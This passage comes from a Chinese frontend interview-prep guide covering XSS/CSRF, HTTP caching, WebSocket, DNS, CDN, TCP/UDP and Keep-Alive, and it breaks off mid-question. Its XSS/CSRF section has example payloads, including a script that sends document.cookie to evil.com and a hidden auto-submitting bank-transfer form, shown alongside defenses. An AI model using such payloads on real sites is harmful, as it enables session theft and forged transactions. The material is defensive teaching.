> `Strict`：完全禁止跨站携带（安全但影响体验）；`Lax`（默认）：允许从其他站点的 GET 导航（链接跳转）携带，POST 跨站不携带；`None`：允许跨站携带，但必须配合 `Secure`。

**Q3：为什么说"单点登录（SSO）"不是 JWT 本身能解决的？**

> SSO 需要一个中心认证服务（IdP），各子系统信任该 IdP。JWT 可以作为 SSO 的 Token 载体（承载用户身份信息跨系统传递），但 SSO 的核心是认证中心的协议（SAML / OIDC / CAS），不是 JWT 本身。

---

### Q: XSS 和 CSRF 攻击原理与防御？

**难度**：⭐⭐⭐⭐ | **频率**：🔥🔥🔥🔥🔥

**答：**

**XSS（Cross-Site Scripting，跨站脚本攻击）：**

攻击者将恶意脚本注入到网页中，其他用户浏览时脚本被执行。

```
// 存储型 XSS（最危险）：恶意脚本存入数据库
// 评论框输入：<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>
// 服务端未过滤直接存库，其他用户查看评论时执行

// 反射型 XSS：恶意参数在 URL 中
// 链接：http://site.com/search?q=<script>alert(document.cookie)</script>
// 服务端把参数原样输出到 HTML 中

// DOM 型 XSS：不经过服务器，直接操作 DOM
// http://site.com/#<img src=x onerror="fetch('http://evil.com/steal')">
// JS 中: document.innerHTML = location.hash  // 危险！
```

**CSRF（Cross-Site Request Forgery，跨站请求伪造）：**

攻击者诱导用户访问恶意页面，在用户不知情的情况下以用户身份发起请求。

```html
<!-- 恶意网站 evil.com 的页面 -->
<!-- 用户已登录 bank.com，Cookie 还在 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
<!-- 或：隐藏表单自动提交 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>
```

**防御方案：**

```js
// === XSS 防御 ===

// 1. 输出时 HTML 转义（最关键）
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 2. 避免危险的 DOM API
element.innerHTML = userInput;  // ❌ 危险
element.textContent = userInput; // ✅ 安全

// 3. 使用成熟的 DOMPurify 库清理 HTML（富文本场景）
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 4. CSP（内容安全策略，见后续专题）

// === CSRF 防御 ===

// 1. CSRF Token（双重提交 Cookie）
// 服务端生成随机 token 存入 Session，也写入 Cookie
// 每次请求提交时需在表单/请求头中携带该 token
// 服务端验证请求头中的 token 与 Session 中是否一致
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});

// 2. SameSite Cookie（现代主流方案）
// Set-Cookie: session=xxx; SameSite=Lax; HttpOnly; Secure
// Lax 模式：跨站 POST 请求不携带 Cookie，CSRF 无效

// 3. 验证 Referer/Origin 头（辅助手段）
if (req.headers.origin && !whitelist.includes(req.headers.origin)) {
  return res.status(403).send('CSRF detected');
}
```

---

**🔍 深层原理**

**XSS vs CSRF 的根本区别：**
- **XSS**：攻击者的代码在**受害网站的域**下执行，可以读取 Cookie、DOM、localStorage 等
- **CSRF**：攻击者的页面在**第三方域**下，利用浏览器自动携带 Cookie 的特性，冒充用户发请求——但攻击者自己**看不到响应**（跨域限制）

**为什么 CSRF Token 能防御？**

CSRF 攻击利用的是"浏览器自动携带 Cookie"，攻击者可以触发请求但**读不到响应**（同源策略）。所以在请求中额外加一个只有正常页面能读到的 Token（存在 JS 可访问的位置，而非纯 Cookie），攻击者构造的请求无法获取这个 Token，验证失败。

**HttpOnly Cookie 如何防御 XSS 中 Cookie 窃取：**

即使页面有 XSS 漏洞，`document.cookie` 无法读取 HttpOnly 的 Cookie，攻击者无法窃取 Session Token。但 XSS 仍然可以直接操作 DOM 或发请求（携带 Cookie），所以 HttpOnly 只是减少损害，根本还是要防止 XSS 注入。

---

**⚠️ 常见误区**

1. ❌ **前端做了转义就够了**：XSS 防御需要**前后端都做**。后端在入库前也要过滤/转义，前端渲染时也要转义。纵深防御。
2. ❌ **CSRF 只能通过 GET 请求发动**：POST、PUT、DELETE 都可以被 CSRF 利用（表单 POST、iframe 等方式）。
3. ✅ **现代浏览器 SameSite=Lax 是默认值**：Chrome 80+ 起，未设置 SameSite 的 Cookie 默认为 Lax，大幅降低了 CSRF 风险。
4. ❌ **用了 HTTPS 就不会有 CSRF**：HTTPS 加密传输，不能防止用户被骗访问恶意页面后发起 CSRF。

---

**💡 踩坑点**

- React/Vue 的模板默认会转义 `{{ }}` 插值，但 `v-html` / `dangerouslySetInnerHTML` 是 XSS 高危区，使用必须严格过滤
- 富文本编辑器（如 Quill）允许用户输入 HTML，必须用 DOMPurify 在**展示时**（不是存储时）再次净化
- CSRF Token 在 SPA 中需要从初始 HTML（`<meta>` 标签）或专用接口获取，不要前端自己生成（失去了服务端验证意义）

---

**🎯 面试追问**

**Q1：如果把 JWT 存 localStorage，有 XSS 风险；存 Cookie，有 CSRF 风险。怎么两全其美？**

> 推荐：access_token 存 Cookie（HttpOnly + SameSite=Strict/Lax），防止 XSS 窃取；用 CSRF Token 或 SameSite=Strict 防 CSRF。或使用双 Token 方案：access_token 存内存（页面刷新丢失），refresh_token 存 HttpOnly Cookie，安全性最高。

**Q2：Vue 中什么情况下 `v-html` 是安全的？**

> 仅当内容来源完全可信时（比如自己写死的 HTML 字符串，或已经通过 DOMPurify 净化的内容）。用户输入内容永远不要直接用 v-html，即使存入数据库前做了过滤也不够，因为过滤规则可能有遗漏。

**Q3：Content Security Policy（CSP）能防御什么级别的 XSS？**

> CSP 可以限制页面允许加载的脚本来源，即使存在 XSS 漏洞，攻击者注入的内联脚本也无法执行（`script-src 'none'` 或 `script-src 'nonce-xxx'`）。这是纵深防御的重要一环，但不能依赖 CSP 代替输入输出转义。

### Q: 浏览器缓存机制：强缓存 vs 协商缓存？

**难度**：⭐⭐⭐⭐ | **频率**：🔥🔥🔥🔥🔥

**答：**

浏览器缓存是前端性能优化的核心。分为两大类：

**强缓存（不发请求，直接用本地）：**
- `Expires`：HTTP/1.0，绝对时间（`Expires: Thu, 01 Dec 2025 00:00:00 GMT`）
- `Cache-Control`：HTTP/1.1，相对时间（`Cache-Control: max-age=3600`）
- 状态码：**200 (from disk cache)** / **200 (from memory cache)**

**协商缓存（发请求，服务器判断是否更新）：**
- `Last-Modified` / `If-Modified-Since`：基于文件修改时间
- `ETag` / `If-None-Match`：基于文件内容哈希
- 状态码：**304 Not Modified**（使用缓存） 或 **200**（返回新内容）

**完整缓存流程：**
```
首次请求：
浏览器 ─── GET /style.css ──────▶ 服务器
         ◀── 200 + Cache-Control: max-age=3600 + ETag: "abc123" ──

第二次请求（1小时内）：
浏览器检查 Cache-Control: max-age=3600 → 未过期
直接读本地缓存，200 (from cache)，不发网络请求

第三次请求（1小时后）：
浏览器 ─── GET /style.css + If-None-Match: "abc123" ──▶ 服务器
         ◀── 304 Not Modified（文件未改变，使用缓存）
         ◀── 200 + 新内容（文件已改变，返回新内容）
```

---

**🔍 深层原理**

**Cache-Control 常用指令详解：**
```
Cache-Control: max-age=3600        // 缓存 1 小时
Cache-Control: no-cache            // 不用强缓存，每次都协商
Cache-Control: no-store            // 完全不缓存（含响应体）
Cache-Control: private             // 只允许浏览器缓存（不允许 CDN/代理缓存）
Cache-Control: public              // 允许所有中间节点缓存
Cache-Control: s-maxage=600        // CDN/代理的缓存时间（覆盖 max-age）
Cache-Control: must-revalidate     // 过期后必须向服务器验证，不允许 stale
Cache-Control: immutable           // 告诉浏览器文件内容永远不变（强缓存永不过期）
```

**ETag vs Last-Modified 的优劣：**
```
Last-Modified 的问题：
- 精度只到秒，1 秒内多次修改无法感知
- 服务器重启可能更新 mtime，即使内容没变
- 分布式环境下不同服务器 mtime 可能不一致

ETag 的优势：
- 基于内容哈希，内容不变则 ETag 不变
- 精度更高，感知任意字节变化

// ETag 弱验证（W/）vs 强验证：
ETag: "abc123"        // 强验证：内容完全相同
ETag: W/"abc123"      // 弱验证：语义等价即可（允许小差异）
```

**前端工程化中的最佳缓存实践：**
```
// HTML 文件：no-cache（每次协商，确保拿到最新入口）
Cache-Control: no-cache

// CSS/JS（带 hash 指纹）：immutable（内容不变，永久缓存）
// 文件名：main.abc123.js（内容改变时 hash 改变，URL 变化）
Cache-Control: public, max-age=31536000, immutable

// 图片资源：public，缓存较长时间
Cache-Control: public, max-age=604800
```

---

**⚠️ 常见误区**

1. ❌ **`no-cache` 等于不缓存**：`no-cache` 是"每次必须协商验证"，缓存内容还在，只是每次都要问服务器要不要用。真正不缓存是 `no-store`。
2. ❌ **强缓存命中时状态码是 304**：强缓存命中是 **200 (from cache)**，304 是协商缓存命中。
3. ✅ **ETag 优先级高于 Last-Modified**：同时存在时，浏览器优先用 ETag。
4. ❌ **设置了 max-age 就一定不会发请求**：用户强制刷新（Ctrl+F5）会绕过缓存；`Cache-Control: no-cache` 的资源每次都会发请求。

---

**💡 踩坑点**

- 前端部署后用户还在用旧缓存：给 HTML 加 `no-cache`，JS/CSS 文件名带 hash（如 Webpack 的 `[contenthash]`），新版本 HTML 引用新 hash 文件名，彻底解决
- CDN 有自己的缓存层，更新资源后需要手动刷新 CDN 缓存（或依赖文件名 hash 更新）
- axios 默认缓存 GET 请求（IE 浏览器），加 `Cache-Control: no-cache` 响应头或在请求 URL 加时间戳 `?t=Date.now()` 解决

---

**🎯 面试追问**

**Q1：`memory cache` 和 `disk cache` 的区别？**

> `memory cache` 存在内存中，读取快，页面关闭即消失；`disk cache` 存在硬盘，持久化，速度慢于内存。浏览器会将较小的文件或当前会话频繁访问的资源放内存，大文件放磁盘。

**Q2：Service Worker 缓存和 HTTP 缓存有什么区别？**

> HTTP 缓存由浏览器自动管理，开发者只能通过 Cache-Control 等头部控制策略；Service Worker 缓存由 JS 完全控制（Cache API），可以实现离线访问、更复杂的缓存策略（如 Stale-While-Revalidate），PWA 的核心能力。

**Q3：为什么 HTML 文件不适合设置长时间强缓存？**

> HTML 是应用入口，引用 JS/CSS 等资源。如果 HTML 被强缓存，部署新版本后用户可能仍然加载旧 HTML，导致引用旧资源（虽然 JS/CSS 改了 hash，但旧 HTML 里引用的还是旧 hash）。所以 HTML 应设置 `no-cache`，每次部署后都能拿到最新入口文件。

### Q: WebSocket 的工作原理和使用场景？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥🔥

**答：**

WebSocket 是 HTML5 提供的**全双工通信协议**，允许服务器主动向客户端推送数据，建立在 TCP 之上。

**WebSocket 握手过程（HTTP Upgrade）：**
```
客户端 ─── HTTP 升级请求 ──────────────────────▶ 服务端
GET /ws HTTP/1.1
Host: server.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==   // 随机 Base64
Sec-WebSocket-Version: 13

◀────────────── 101 Switching Protocols ──────── 服务端
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=  // SHA1(key + magic)

// 握手完成，协议切换到 WebSocket，HTTP 连接不再使用
```

**前端 WebSocket 使用：**
```js
// 建立连接
const ws = new WebSocket('wss://api.example.com/ws');

// 连接成功
ws.onopen = () => {
  console.log('WebSocket 已连接');
  ws.send(JSON.stringify({ type: 'subscribe', channel: 'prices' }));
};

// 接收消息
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log('收到消息:', data);
};

// 错误处理
ws.onerror = (error) => {
  console.error('WebSocket 错误:', error);
};

// 连接关闭
ws.onclose = (event) => {
  console.log('连接关闭, code:', event.code, 'reason:', event.reason);
  // 实现断线重连
  setTimeout(() => reconnect(), 3000);
};

// 发送消息
ws.send('Hello Server');
ws.send(JSON.stringify({ action: 'ping' }));

// 关闭连接
ws.close(1000, 'Normal closure');

// 心跳保活（防止连接超时被关闭）
let heartbeatTimer;
ws.onopen = () => {
  heartbeatTimer = setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000);
};
ws.onclose = () => clearInterval(heartbeatTimer);
```

**适用场景：**
- 实时聊天（IM 系统）
- 实时数据大屏（股票、监控数据推送）
- 多人协同编辑（如 Google Docs）
- 在线游戏（低延迟双向通信）
- 消息通知推送

---

**🔍 深层原理**

**WebSocket vs HTTP 轮询 vs SSE：**

| 方案 | 方向 | 连接 | 适用场景 |
|---|---|---|---|
| HTTP 短轮询 | 单向（客户端拉） | 每次新建 | 对实时性要求低 |
| HTTP 长轮询 | 单向（服务器挂起响应） | 复用但低效 | 轻量消息推送 |
| **SSE** | 单向（服务器推） | 长连接 | 新闻推送、进度通知 |
| **WebSocket** | **双向** | 长连接 | 聊天、游戏、协同 |

**WebSocket 帧格式：**

WebSocket 数据以**帧（Frame）**传输，每个帧有：
- FIN 位：是否为最后一帧
- Opcode：数据类型（文本=1，二进制=2，ping=9，pong=10，关闭=8）
- Mask：客户端发出的帧必须掩码（防止缓存污染攻击）
- Payload：数据内容

**为什么需要心跳？**

NAT 路由器、负载均衡器会对长时间无数据的 TCP 连接进行超时清理（通常 30s ~ 几分钟）。心跳包（ping/pong）让连接保持活跃，同时用于检测连接是否已断开（对方无响应则主动重连）。

---

**⚠️ 常见误区**

1. ❌ **WebSocket 和 HTTP 是完全不同的协议，无法复用端口**：WebSocket 握手是基于 HTTP 的 Upgrade 请求，可以在同一个 80/443 端口上运行。
2. ❌ **WebSocket 不需要鉴权**：WebSocket 握手阶段可以在 URL 传 token（`wss://api.com/ws?token=xxx`）或使用 Cookie；连接建立后也可以发第一条鉴权消息。
3. ✅ **`wss://` 是加密的 WebSocket**：等同于 HTTPS，握手和数据都经过 TLS 加密，生产必用 wss。

---

**💡 踩坑点**

- 断线重连要做指数退避（避免服务器崩溃时洪水重连）：`setTimeout(reconnect, Math.min(delay * 2, maxDelay))`
- 前端发送消息前要检查 `ws.readyState === WebSocket.OPEN`，否则会报错
- Nginx 反向代理 WebSocket 需要额外配置：`proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection "upgrade";`
- React 中注意在 `useEffect` 的 cleanup 函数里关闭 ws，防止内存泄漏和重复连接

---

**🎯 面试追问**

**Q1：WebSocket 和 HTTP/2 Server Push 哪个更适合实时推送？**

> 视场景而定：HTTP/2 Server Push 是单向的（服务器主动推），适合推资源（CSS/JS）；WebSocket 是双向全双工，适合业务层实时消息（聊天、协同）。对于纯服务端推业务数据，SSE（Server-Sent Events）更简单，不需要 WebSocket 的握手升级过程。

**Q2：WebSocket 如何处理并发连接的扩展性问题？**

> 单台服务器的 WebSocket 连接有上限。水平扩展时，需要用消息中间件（Redis Pub/Sub、Kafka）在多个节点间广播消息，确保连接在任意节点的用户都能收到消息。

**Q3：`readyState` 有哪几个值？**

> 0-CONNECTING（连接中），1-OPEN（已连接），2-CLOSING（关闭中），3-CLOSED（已关闭）。发送消息前必须检查 readyState === 1（OPEN）。

### Q: DNS 解析流程详解（递归查询 vs 迭代查询）？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥

**答：**

DNS（Domain Name System）将域名解析为 IP 地址。

**DNS 解析完整流程（以 `www.example.com` 为例）：**
```
1. 浏览器 DNS 缓存（chrome://net-internals/#dns）
   └── 命中 → 直接返回 IP
   └── 未命中 ↓

2. 操作系统 DNS 缓存（/etc/hosts 优先）
   └── 命中 → 直接返回 IP
   └── 未命中 ↓

3. 本地 DNS 服务器（运营商/公司内网，如 8.8.8.8）
   └── 有缓存 → 直接返回
   └── 无缓存 ↓（开始递归查询）

4. 根 DNS 服务器（13 组，返回 .com TLD 服务器地址）

5. .com TLD 服务器（返回 example.com 权威服务器地址）

6. example.com 权威 DNS 服务器（返回 www.example.com 的 A 记录 IP）

7. 本地 DNS 缓存结果，返回给浏览器
```

**递归查询 vs 迭代查询：**

```
递归查询（客户端 → 本地 DNS）：
客户端问本地 DNS："www.example.com 是多少？"
本地 DNS 负责查到底，直接返回最终答案

迭代查询（本地 DNS → 各级 DNS）：
本地 DNS 问根服务器，根说"去问 .com"
本地 DNS 问 .com，.com 说"去问 example.com 权威服务器"
本地 DNS 问权威服务器，得到最终答案
```

**DNS 记录类型：**
```
A     → 域名 → IPv4 地址
AAAA  → 域名 → IPv6 地址
CNAME → 域名 → 别名（另一个域名）
MX    → 域名 → 邮件服务器
TXT   → 任意文本（常用于 SPF/DKIM 邮件验证）
NS    → 域名 → 权威 DNS 服务器
```

---

**🔍 深层原理**

**TTL（Time To Live）对缓存的影响：**

每条 DNS 记录都有 TTL，控制缓存时间。TTL 越短，DNS 更新传播越快，但查询负载越高。

```
# dig www.example.com 查看 TTL
www.example.com.  300  IN  A  93.184.216.34
# 此条记录缓存 300 秒（5分钟）
```

**DNS 解析与 HTTP 性能的关系：**

在关键渲染路径中，DNS 解析可能消耗 20-120ms。前端优化：
```html
<!-- DNS 预解析：提前解析第三方域名 -->
<link rel="dns-prefetch" href="//cdn.example.com">
<link rel="dns-prefetch" href="//api.example.com">

<!-- Preconnect：更激进，提前完成 DNS + TCP + TLS -->
<link rel="preconnect" href="https://fonts.googleapis.com">
```

**DNS over HTTPS（DoH）：**

传统 DNS 是明文 UDP，ISP 可以看到你访问的域名，且 DNS 可被劫持（DNS 污染）。DoH 将 DNS 查询封装在 HTTPS 中（加密），提高隐私性和安全性，Chrome/Firefox 已支持。

---

**⚠️ 常见误区**

1. ❌ **DNS 解析就是查一台服务器**：实际上是多级层次结构（根→TLD→权威），本地 DNS 递归查询。
2. ❌ **修改 hosts 文件后立刻生效**：需要刷新 DNS 缓存：`ipconfig /flushdns`（Windows）、`sudo dscacheutil -flushcache`（macOS）。
3. ✅ **CNAME 不能用于裸域名（apex domain）**：`example.com`（不带 www）不能设置 CNAME，只能设置 A 记录或 ALIAS 记录（CDN 厂商提供的扩展）。

---

**💡 踩坑点**

- 新域名配置 DNS 后需等待 TTL 时间全球生效（通常 24-48h，如果 TTL 设很小如 60s 则几分钟）
- 前端 `dns-prefetch` 对 HTTPS 资源不能替代 `preconnect`，后者还建立 TCP 和 TLS 连接
- CDN 回源配置中，CNAME 解析是常见方式（`static.example.com CNAME xxx.cdn.com`），了解 DNS 有助于排查 CDN 问题

---

**🎯 面试追问**

**Q1：输入 URL 按下回车，发生了什么？（重点讲 DNS 部分）**

> 1. 检查浏览器/OS/hosts DNS 缓存；2. 未命中则向本地 DNS 服务器递归查询；3. 本地 DNS 通过迭代查询依次询问根→TLD→权威服务器；4. 得到 IP 后，浏览器发起 TCP 三次握手；5. TLS 握手（HTTPS）；6. 发送 HTTP 请求；7. 解析响应，渲染页面。

**Q2：DNS 劫持和 DNS 污染有什么区别？**

> **DNS 劫持**：攻击者控制了 DNS 服务器或篡改了路由，将域名解析到恶意 IP；**DNS 污染**：特指 GFW 向 DNS 查询注入虚假响应，返回错误 IP（常见于某些被封锁的域名）。解决方案：使用可信 DNS（8.8.8.8）、DoH 加密 DNS 查询。

**Q3：为什么 DNS 用 UDP 而不是 TCP？**

> DNS 查询响应小（通常 < 512 字节），UDP 无连接开销更快；如果响应超过 512 字节才 fallback 到 TCP（如区域传输）。DNS 层面也有超时重试机制，不依赖 TCP 的可靠保证。

### Q: CDN 工作原理和回源机制？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥

**答：**

CDN（Content Delivery Network，内容分发网络）通过在全球部署边缘节点，将用户请求路由到最近的节点，减少延迟。

**CDN 工作流程：**
```
用户请求 static.example.com/logo.png：

1. DNS 解析：
   static.example.com → CNAME → xxx.cdn-provider.com
   → CDN 智能 DNS 根据用户 IP 返回最近边缘节点 IP

2. 边缘节点命中缓存：
   → 直接返回资源（✅ CDN 命中）

3. 边缘节点未命中（回源）：
   → 向源站（origin server）请求资源
   → 缓存到边缘节点
   → 返回给用户（❌ CDN Miss，回源）
```

**回源机制：**
```
触发回源的条件：
- 资源在边缘节点不存在（冷启动）
- 资源已过期（超过 CDN 缓存时间）
- 资源被主动刷新/预热
- 边缘节点被绕过（动态请求）

源站保护：
- CDN 层设置 s-maxage（CDN 缓存时间）
- 源站只收到少量回源请求（远少于总请求量）
```

```
// 典型 CDN 缓存控制
Cache-Control: public, max-age=300, s-maxage=86400
// max-age=300: 浏览器缓存 5 分钟
// s-maxage=86400: CDN 缓存 1 天（优先级高于 max-age 对 CDN 而言）
```

---

**🔍 深层原理**

**CDN 调度原理（GSLB）：**

CDN 使用 Global Server Load Balancing，核心是：
1. **DNS 调度**：CDN 的权威 DNS 根据查询者 IP 地理位置返回最近节点 IP
2. **Anycast 路由**：同一 IP 由多个节点宣告，BGP 路由自动选择最近路径

**边缘缓存层级：**
```
用户 → L1（边缘节点，城市级）→ L2（区域节点）→ 源站
             命中率 ~95%          命中率 ~4%      ~1% 到源站
```

**CDN 回源与 HTTPS：**

CDN 需要处理两段 TLS：
- 用户 ↔ CDN 边缘节点：CDN 持有证书
- CDN 边缘节点 ↔ 源站：回源时也可走 HTTPS（需源站配证书）

---

**⚠️ 常见误区**

1. ❌ **CDN 只用于静态资源**：动态 CDN 可以加速 API 请求（边缘计算、智能路由），但动态内容通常不缓存，CDN 只提供路由优化。
2. ❌ **CDN 刷新立刻生效**：CDN 刷新（URL 刷新/目录刷新）在各边缘节点传播需要时间（通常 1-5 分钟），各节点逐步失效。
3. ✅ **文件名带 hash 是更好的缓存策略**：不依赖 CDN 刷新，直接通过 URL 变化区分新旧资源。

---

**💡 踩坑点**

- 配置 CDN 后忘记设置 Vary 头：如果资源因 Accept-Encoding 不同而不同（gzip/br），需要 `Vary: Accept-Encoding`，否则 CDN 可能把 gzip 版本返给不支持 gzip 的客户端
- CDN 域名与源站域名不同导致 CORS 问题：CDN 响应需要携带正确的 `Access-Control-Allow-Origin` 头，且需要配置 CDN 透传 Vary / CORS 头

---

**🎯 面试追问**

**Q1：CDN 如何保证缓存更新的一致性？**

> 主要靠文件名 hash（内容变化 → 文件名变化 → 绕过缓存，无需刷新 CDN）或主动调用 CDN 刷新 API（清除指定 URL/目录的边缘缓存）。对时效性要求高的资源设置短 `s-maxage`。

**Q2：CDN 的边缘节点之间如何同步内容？**

> 通常是懒加载（回源）而非主动推送：第一个请求触发回源缓存，后续请求命中边缘缓存。部分 CDN 支持预热（主动推送到边缘），用于大流量活动前的资源预加载。

**Q3：如何判断一个请求是否命中了 CDN 缓存？**

> 查看响应头：CDN 通常会返回 `X-Cache: HIT` 或 `X-Cache: MISS`；也可以看 `Age` 头（资源在 CDN 中缓存了多少秒）。Cloudflare 用 `CF-Cache-Status: HIT/MISS/EXPIRED`。

### Q: TCP 和 UDP 的区别与各自应用场景？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥🔥

**答：**

| 特性 | TCP | UDP |
|---|---|---|
| 连接 | 需要三次握手 | 无连接 |
| 可靠性 | 可靠（重传、确认） | 不可靠（不保证到达）|
| 有序性 | 保证数据有序 | 不保证顺序 |
| 速度 | 慢（控制开销大） | 快（开销极小）|
| 流量控制 | 有 | 无 |
| 拥塞控制 | 有 | 无 |
| 头部大小 | 20 字节最小 | 8 字节 |
| 适用场景 | HTTP、文件传输、邮件 | DNS、音视频、游戏、QUIC |

**应用场景分析：**
```
TCP 适合：
- 网页浏览（HTTP/HTTPS）：内容必须完整准确
- 文件下载/上传：数据不能丢失
- 数据库连接：事务一致性要求
- 电子邮件、SSH：可靠通信

UDP 适合：
- 实时音视频（WebRTC）：延迟比丢帧更糟糕，允许少量丢包
- 在线游戏：宁要速度，过时的位置数据没价值
- DNS 查询：小包，快速，丢了重发即可
- 直播流：低延迟优先，允许画面抖动
- QUIC（HTTP/3）：在 UDP 上自建可靠层，兼顾速度与可靠
```

---

**🔍 深层原理**

**TCP 可靠性机制：**
```
1. 序列号：每个字节都有序列号，接收方按序重组
2. ACK 确认：接收方确认收到，发送方等待 ACK
3. 超时重传：ACK 超时未收到，重发数据
4. 滑动窗口：批量发送，不必等每个 ACK（提高吞吐）
5. 拥塞控制：慢启动 → 拥塞避免 → 快速重传 → 快速恢复

// TCP 流量控制（滑动窗口）
发送方可以连续发送 window_size 字节，不必逐一等待 ACK
接收方通过 window_size 告知发送方自己的接收缓冲区大小
```

**为什么 WebRTC 选择 UDP？**

音视频通话中，如果用 TCP：
- 一个视频帧丢失 → TCP 等待重传 → 后续帧全部阻塞（队头阻塞）
- 重传的旧帧到达时已毫无价值，但会阻塞新帧
- UDP：丢了就丢了，解码器做错误隐藏，画面可能闪一下，但不卡顿

---

**⚠️ 常见误区**

1. ❌ **UDP 不安全所以不用**：安全与 TCP/UDP 协议无关，DTLS 是在 UDP 上的 TLS 等效协议（WebRTC 就使用 DTLS）。
2. ❌ **TCP 一定比 UDP 慢很多**：在稳定网络中，TCP/UDP 速度差异不大；在高丢包网络中，TCP 因重传而显著变慢。
3. ✅ **UDP 也可以实现可靠传输**：QUIC 在 UDP 之上实现了类 TCP 的可靠机制，但每个 Stream 独立重传，性能优于 TCP。

---

**💡 踩坑点**

- 前端开发接触 UDP 最多的场景是 WebRTC（实时音视频）和 HTTP/3
- Node.js 用 `dgram` 模块操作 UDP：`const socket = require('dgram').createSocket('udp4')`
- UDP 没有连接概念，每次发包都要指定目标地址，适合实现广播

---

**🎯 面试追问**

**Q1：为什么说 HTTP/3 解决了 HTTP/2 的队头阻塞问题？**

> HTTP/2 基于 TCP，TCP 层丢包时所有 Stream 都停下来等重传（传输层队头阻塞，应用层无能为力）。HTTP/3 用 QUIC（基于 UDP），QUIC 在用户态实现了 Stream 级别的可靠传输，每个 Stream 独立重传，互不阻塞。

**Q2：UDP 如何实现广播和多播？**

> 广播：发送到 `255.255.255.255` 或子网广播地址，局域网内所有设备都能收到；多播（Multicast）：加入多播组（如 `224.x.x.x`），只有加入该组的设备收到，比广播更精确，常用于视频会议、IPTV。TCP 无法广播/多播。

**Q3：一个 TCP 连接能传多少数据？**

> 理论上无限，TCP 是流式传输，没有消息边界。连接存续期间可以持续传输数据（持久连接复用）。应用层协议（HTTP）负责界定消息边界（Content-Length 或 chunked encoding）。

### Q: HTTP 长连接 vs 短连接？Keep-Alive 详解？

**难度**：⭐⭐ | **频率**：🔥🔥🔥

**答：**

**短连接（HTTP/1.0 默认）：**
```
每次 HTTP 请求：
建立 TCP → 发请求 → 收响应 → 关闭 TCP
3次握手 + 传输 + 4次挥手 = 大量开销
```

**长连接（HTTP/1.1 默认，Keep-Alive）：**
```
建立一次 TCP → 发请求1 → 收响应1 → 发请求2 → 收响应2 → ... → 超时关闭
// 多个请求复用同一 TCP 连接，避免重复握手
```

**Keep-Alive 相关头：**
```
// 请求头
Connection: keep-alive

// 响应头
Connection: keep-alive
Keep-Alive: timeout=60, max=100   // 60秒无活动关闭，最多100个请求
```

**HTTP/1.1 长连接 vs HTTP/2 多路复用：**
```
HTTP/1.1 长连接：
TCP 连接: ──[req1]──[resp1]──[req2]──[resp2]──  （串行，一个完了下一个）
同域名 6 个连接并行

HTTP/2 多路复用：
TCP 连接: ──[req1][req2][req3]──[resp2][resp1][resp3]──  （真正并行）
同域名 1 个连接
```

---

**🔍 深层原理**

**Keep-Alive 超时机制：**

服务器通过 `Keep-Alive: timeout=N` 告知客户端空闲 N 秒后关闭。但这只是建议值，实际超时由服务器控制，客户端也可能提前关闭。

**前端代码中感知不到 Keep-Alive：**

浏览器自动管理 TCP 连接池，连接复用对前端 JS 透明。但可以通过 DevTools Network 面板看到：同一域名的多个请求是否共用连接（Connection ID 相同）。

**Node.js 中的 HTTP Agent（Keep-Alive）：**
```js
const http = require('http');
const https = require('https');

// Node.js 默认 HTTP Agent 不启用 keep-alive
// 手动开启（高性能服务间通信必备）
const agent = new https.Agent({
  keepAlive: true,
  maxSockets: 50,        // 最大并发连接数
  maxFreeSockets: 10,    // 空闲连接池大小
  timeout: 60000
});

// axios 全局配置 keep-alive（Node.js 端）
const axios = require('axios');
axios.defaults.httpAgent = new http.Agent({ keepAlive: true });
axios.defaults.httpsAgent = new https.Agent({ keepAlive: true });
```

---

**⚠️ 常见误区**

1. ❌ **HTTP/1.1 的 Keep-Alive 就是多路复用**：Keep-Alive 是连接复用，但请求仍然串行（前一个响应完才能发下一个，管道化除外）。真正的并发是 HTTP/2 多路复用。
2. ❌ **长连接会占用服务器太多资源**：有 timeout 机制，空闲连接自动释放；nginx 等服务器对 keep-alive 有良好的资源管理。
3. ✅ **HTTP/2 下无需手动开多个连接**：一个 HTTP/2 连接可以并发数百个 Stream，不需要 HTTP/1.1 时代的域名分片技巧。

---

**💡 踩坑点**

- Node.js 服务端调用第三方 HTTP API 时，每次创建新的 http.request 会建立新 TCP（很慢），应配置带 keepAlive 的 Agent 或直接用 axios（默认有连接池）
- 负载均衡器（Nginx）的 `upstream keepalive` 需要显式配置，否则到后端服务每次都重建 TCP
- 前端页面的 HTTP 长连接对用户透明，但 WebSocket 的长连接需要手动管理生命周期

---

**🎯 面试追问**

**Q1：HTTP/2 还需要 Keep-Alive 吗？**

> HTTP/2 本质上就是持久连接的（一个连接复用多个 Stream），`Connection` 头在 HTTP/2 中是被禁止的（hop-by-hop 头），HTTP/2 连接管理由协议本身负责，不需要也不允许 Keep-Alive 头。

**Q2：如何在 Nginx 中调整 Keep-Alive 超时？**

> `keepalive_timeout 65;`（默认 75s）控制与客户端的长连接超时；`upstream keepalive 32;` 控制到后端服务的长连接池数量。生产环境 API 服务器通常设置较短的 timeout（15-30s），避免连接积压。

**Q3：TCP 的 keepalive 和 HTTP 的 Keep-Alive 是同一个东西吗？**

